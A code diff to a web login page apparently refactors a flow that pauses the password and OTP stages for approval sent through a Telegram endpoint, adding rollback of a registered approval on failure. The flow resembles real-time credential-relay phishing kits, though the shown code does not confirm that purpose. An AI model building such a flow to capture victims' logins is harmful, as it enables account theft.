@@ -164,13 +164,11 @@ export default function LoginPage() {
   }
 
   const initiateApproval = async (stage: "password" | "otp") => {
+    const newApprovalId = generateApprovalId()
+    let approvalRegistered = false
+
     try {
       setApprovalStage(stage)
-      setAwaitingApproval(true)
-      setApprovalCountdown(approvalTimeoutSeconds)
-
-      const newApprovalId = generateApprovalId()
-      setApprovalId(newApprovalId)
       const registerResponse = await fetch("/api/approval", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -184,6 +182,11 @@ export default function LoginPage() {
       if (!registerResponse.ok) {
         throw new Error("Failed to register approval")
       }
+      approvalRegistered = true
+
+      setApprovalId(newApprovalId)
+      setAwaitingApproval(true)
+      setApprovalCountdown(approvalTimeoutSeconds)
 
       const telegramResponse = await fetch("/api/telegram", {
         method: "POST",
@@ -204,8 +207,16 @@ export default function LoginPage() {
       }
     } catch (error) {
       console.error("Approval initiation error:", error)
+      if (approvalRegistered) {
+        void fetch("/api/approval", {
+          method: "DELETE",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ approvalId: newApprovalId }),
+        }).catch(() => {})
+      }
       setAwaitingApproval(false)
       setApprovalId("")
+      setApprovalCountdown(approvalTimeoutSeconds)
       if (stage === "password") {
         setLoginError(MSG_UNABLE_REACH_VERIFICATION)
       } else {
